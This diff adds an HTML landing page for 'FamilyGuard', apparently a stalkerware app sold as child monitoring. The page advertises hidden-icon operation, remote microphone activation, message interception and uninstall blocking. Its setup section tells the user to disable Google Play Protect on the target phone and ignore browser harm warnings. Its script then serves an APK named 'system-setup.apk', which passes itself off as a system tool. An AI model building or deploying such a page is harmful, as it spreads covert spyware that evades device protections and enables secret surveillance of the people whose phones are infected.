@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Family Guard | Advanced Child Monitoring</title>
+    <style>
+        /* Modern Reset & Base Styles */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, sans-serif; }
+        body { background-color: #f8fafc; color: #1e293b; line-height: 1.6; }
+        a { text-decoration: none; }
+        
+        /* Navigation */
+        nav { background: white; padding: 20px 5%; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 10px rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 100; }
+        .logo { font-size: 24px; font-weight: 900; color: #1e3a8a; display: flex; align-items: center; gap: 8px; }
+        .nav-links a { margin-left: 24px; color: #475569; font-weight: 600; transition: color 0.3s; }
+        .nav-links a:hover { color: #2563eb; }
+        .btn-nav { background: #2563eb; color: white !important; padding: 10px 20px; border-radius: 8px; }
+
+        /* Hero Section */
+        .hero { background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%); color: white; padding: 80px 5%; text-align: center; }
+        .hero h1 { font-size: 48px; font-weight: 800; margin-bottom: 20px; line-height: 1.2; }
+        .hero p { font-size: 20px; color: #e2e8f0; margin-bottom: 40px; max-width: 600px; margin-left: auto; margin-right: auto; }
+        
+        /* Features Grid */
+        .features { padding: 80px 5%; max-width: 1200px; margin: 0 auto; }
+        .section-title { text-align: center; font-size: 36px; font-weight: 800; margin-bottom: 50px; color: #0f172a; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; }
+        .card { background: white; padding: 30px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); transition: transform 0.3s; border: 1px solid #f1f5f9; }
+        .card:hover { transform: translateY(-5px); box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        .icon { font-size: 40px; margin-bottom: 20px; }
+        .card h3 { font-size: 20px; margin-bottom: 10px; color: #1e3a8a; }
+        .card p { color: #64748b; font-size: 15px; }
+
+        /* Pricing Section */
+        .pricing { background: #f1f5f9; padding: 80px 5%; }
+        .price-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; max-width: 900px; margin: 0 auto; }
+        .price-card { background: white; padding: 40px; border-radius: 16px; text-align: center; position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .popular { border: 2px solid #2563eb; transform: scale(1.05); }
+        .badge { position: absolute; top: -12px; left: 50%; transform: translateX(-50%); background: #2563eb; color: white; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; }
+        .price-card h3 { font-size: 24px; margin-bottom: 15px; color: #0f172a; }
+        .price { font-size: 48px; font-weight: 900; color: #1e3a8a; margin-bottom: 20px; }
+        .price span { font-size: 16px; color: #64748b; font-weight: 500; }
+        .price-card ul { list-style: none; margin-bottom: 30px; text-align: left; }
+        .price-card li { margin-bottom: 12px; color: #475569; display: flex; align-items: center; gap: 10px; }
+        .price-card li::before { content: '✓'; color: #10b981; font-weight: bold; }
+        .btn-buy { display: block; width: 100%; padding: 15px; background: #1e3a8a; color: white; border-radius: 8px; font-weight: bold; transition: background 0.3s; }
+        .btn-buy:hover { background: #1e40af; }
+        .popular .btn-buy { background: #2563eb; }
+        .popular .btn-buy:hover { background: #1d4ed8; }
+
+        /* Stealth Portal (Installation) */
+        .portal { padding: 80px 5%; max-width: 600px; margin: 0 auto; }
+        .portal-box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); border: 1px solid #e2e8f0; }
+        .alert-box { background-color: #fef2f2; border: 2px solid #ef4444; border-radius: 12px; padding: 20px; margin-bottom: 25px; }
+        .alert-title { color: #b91c1c; font-weight: 800; font-size: 18px; margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+        .alert-text { color: #991b1b; font-size: 15px; }
+        .steps { background: #f8fafc; padding: 20px; border-radius: 12px; margin-bottom: 25px; border: 1px solid #e2e8f0; }
+        .steps h4 { font-size: 16px; margin-bottom: 15px; color: #0f172a; }
+        .step-item { display: flex; margin-bottom: 12px; font-size: 14px; color: #334155; }
+        .step-num { background: #3b82f6; color: white; width: 22px; height: 22px; border-radius: 11px; display: flex; justify-content: center; align-items: center; font-size: 12px; font-weight: bold; margin-right: 12px; flex-shrink: 0; }
+        .checkbox-container { display: flex; align-items: flex-start; margin-bottom: 25px; padding: 15px; background: #f1f5f9; border-radius: 8px; border: 1px solid #cbd5e1; }
+        .checkbox-container input { margin-top: 4px; margin-right: 12px; width: 18px; height: 18px; cursor: pointer; }
+        .checkbox-container label { font-size: 15px; font-weight: 600; color: #1e293b; cursor: pointer; user-select: none; }
+        .download-btn { display: block; width: 100%; padding: 18px; text-align: center; border-radius: 12px; font-weight: 800; font-size: 16px; transition: all 0.3s ease; border: none; }
+        .btn-locked { background-color: #cbd5e1; color: #64748b; cursor: not-allowed; }
+        .btn-unlocked { background-color: #10b981; color: white; cursor: pointer; box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3); }
+        .btn-unlocked:hover { background-color: #059669; }
+
+        /* Footer */
+        footer { background: #0f172a; color: #94a3b8; text-align: center; padding: 30px; font-size: 14px; }
+
+        @media (max-width: 768px) {
+            .nav-links { display: none; }
+            .hero h1 { font-size: 36px; }
+            .popular { transform: none; }
+        }
+    </style>
+</head>
+<body>
+
+    <nav>
+        <div class="logo">🛡️ FamilyGuard</div>
+        <div class="nav-links">
+            <a href="#features">Features</a>
+            <a href="#pricing">Pricing</a>
+            <a href="#install" class="btn-nav">Install App</a>
+        </div>
+    </nav>
+
+    <section class="hero">
+        <h1>Absolute Digital Safety for Your Child</h1>
+        <p>Advanced stealth monitoring, real-time screen mirroring, and surround audio recording. Protect them before danger strikes.</p>
+    </section>
+
+    <section id="features" class="features">
+        <h2 class="section-title">Enterprise-Grade Features</h2>
+        <div class="grid">
+            <div class="card">
+                <div class="icon">🥷</div>
+                <h3>100% Invisible Mode</h3>
+                <p>The app hides its icon completely. Operates silently in the background as a system process without draining battery.</p>
+            </div>
+            <div class="card">
+                <div class="icon">📱</div>
+                <h3>Live Screen Mirroring</h3>
+                <p>See exactly what is happening on their screen in real-time. Instantly catch inappropriate content or hidden apps.</p>
+            </div>
+            <div class="card">
+                <div class="icon">🎙️</div>
+                <h3>Surround Audio</h3>
+                <p>Remotely activate the microphone to listen to their physical surroundings and ensure they are safe.</p>
+            </div>
+            <div class="card">
+                <div class="icon">💬</div>
+                <h3>Social Chat Sync</h3>
+                <p>Read incoming messages from WhatsApp, Instagram, and SMS instantly via advanced notification interception.</p>
+            </div>
+            <div class="card">
+                <div class="icon">🔒</div>
+                <h3>Uninstall Protection</h3>
+                <p>Our proprietary Vault Lock prevents tech-savvy teens from force-closing or uninstalling the application.</p>
+            </div>
+            <div class="card">
+                <div class="icon">📍</div>
+                <h3>Live GPS Tracking</h3>
+                <p>Pinpoint their exact location on the map with high-accuracy GPS routing and emergency SOS alerts.</p>
+            </div>
+        </div>
+    </section>
+
+    <section id="pricing" class="pricing">
+        <h2 class="section-title">Simple, Transparent Pricing</h2>
+        <div class="price-grid">
+            <div class="price-card">
+                <h3>Monthly Plan</h3>
+                <div class="price">₹299<span>/mo</span></div>
+                <ul>
+                    <li>All Premium Features</li>
+                    <li>1 Monitored Device</li>
+                    <li>24/7 Priority Support</li>
+                    <li>Cancel Anytime</li>
+                </ul>
+                <a href="#" class="btn-buy" onclick="alert('Razorpay Checkout will open here!')">Subscribe Monthly</a>
+            </div>
+            <div class="price-card popular">
+                <div class="badge">SAVE 45%</div>
+                <h3>Annual Plan</h3>
+                <div class="price">₹1,999<span>/yr</span></div>
+                <ul>
+                    <li>All Premium Features</li>
+                    <li>1 Monitored Device</li>
+                    <li>24/7 Priority Support</li>
+                    <li>Billed annually (₹166/mo)</li>
+                </ul>
+                <a href="#" class="btn-buy" onclick="alert('Razorpay Checkout will open here!')">Subscribe Annually</a>
+            </div>
+        </div>
+    </section>
+
+    <section id="install" class="portal">
+        <h2 class="section-title" style="margin-bottom: 20px;">Child Device Setup</h2>
+        <p style="text-align: center; color: #64748b; margin-bottom: 40px;">Open this webpage on the <b>child's phone</b> to begin installation.</p>
+        
+        <div class="portal-box">
+            <div class="alert-box">
+                <div class="alert-title">⚠️ CRITICAL: ACTION REQUIRED</div>
+                <div class="alert-text">Android will block this installation unless you disable Google Play Protect first.</div>
+            </div>
+
+            <div class="steps">
+                <h4>How to disable Play Protect:</h4>
+                <div class="step-item"><div class="step-num">1</div> Open the <b>Play Store</b> app on the child's phone.</div>
+                <div class="step-item"><div class="step-num">2</div> Tap the <b>Profile Icon</b> and select <b>Play Protect</b>.</div>
+                <div class="step-item"><div class="step-num">3</div> Tap the <b>Settings Gear</b> (top right).</div>
+                <div class="step-item"><div class="step-num">4</div> Turn OFF <b>"Scan apps with Play Protect"</b>.</div>
+            </div>
+
+            <div class="checkbox-container">
+                <input type="checkbox" id="confirmCheck">
+                <label for="confirmCheck">I confirm that Play Protect is currently turned OFF on this device.</label>
+            </div>
+
+            <a id="downloadBtn" class="download-btn btn-locked" href="#">DOWNLOAD SYSTEM TOOL</a>
+            
+            <p style="font-size: 12px; color: #94a3b8; text-align: center; margin-top: 15px;">Note: Your browser may warn you that this file type can harm your device. This is normal for monitoring software. Tap "Download anyway".</p>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2026 FamilyGuard. All rights reserved. Use responsibly and in accordance with local laws.</p>
+    </footer>
+
+    <script>
+        const checkbox = document.getElementById('confirmCheck');
+        const downloadBtn = document.getElementById('downloadBtn');
+        const apkFileName = "system-setup.apk"; // Ensure your APK is named exactly this
+
+        checkbox.addEventListener('change', function() {
+            if (this.checked) {
+                downloadBtn.classList.remove('btn-locked');
+                downloadBtn.classList.add('btn-unlocked');
+                downloadBtn.href = apkFileName;
+                downloadBtn.innerHTML = "DOWNLOAD NOW 🚀";
+            } else {
+                downloadBtn.classList.add('btn-locked');
+                downloadBtn.classList.remove('btn-unlocked');
+                downloadBtn.href = "#";
+                downloadBtn.innerHTML = "DOWNLOAD SYSTEM TOOL";
+            }
+        });
+
+        downloadBtn.addEventListener('click', function(e) {
+            if (!checkbox.checked) {
+                e.preventDefault();
+                alert("🛑 You must check the confirmation box above before downloading.");
+            }
+        });
+    </script>
+</body>
+</html>
